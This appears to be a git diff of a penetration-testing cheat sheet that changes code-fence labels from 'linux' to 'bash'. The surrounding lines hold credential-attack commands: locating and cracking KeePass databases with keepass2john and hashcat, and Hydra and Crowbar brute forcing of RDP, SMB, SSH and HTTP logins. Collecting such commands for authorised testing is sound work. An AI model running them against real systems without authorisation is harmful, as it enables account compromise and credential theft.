@@ -64,17 +64,17 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 ```
 
 -> Hashing the .kdbx file
-```linux
+```bash
 keepass2john Database.kdbx > keepass.hash   
 ```
 
 -> Finding Hash-Mode ID of hashcat
-```linux
+```bash
 hashcat --help | grep -i "KeePass"
 ```
 
 -> Cracking
-```linux
+```bash
 hashcat -m 13400 keepass.hash
 ```
 
@@ -85,26 +85,26 @@ hydra -L /usr/share/wordlists/rockyou.txt t -p "<password" rdp://<IP>
 ```
 
 ### RDP Brute Force - Crowbar
-```linux
+```bash
 crowbar -b rdp -s X.X.X.X/32 -u admin -C /usr/share/wordlists/rockyou.txt -n 1
 ```
 
 ### SMB Brute Force - Hydra
-```linux
+```bash
 hydra -L /root/Desktop/user.txt -P /usr/share/wordlists/rockyou.txt <IP> smb
 ```
 
 ### SSH Brute Force - Hydra
-```linux
+```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>
 ```
 
 ### HTTP POST Login Form Brute Force - Hydra
-```linux
+```bash
 hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.php:user=admin&pass=^PASS^:Invalid Login" -vV -f
 ```
 
 ### HTTP GET Login Form Brute Force - Hydra
-```linux
+```bash
 hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login
 ```
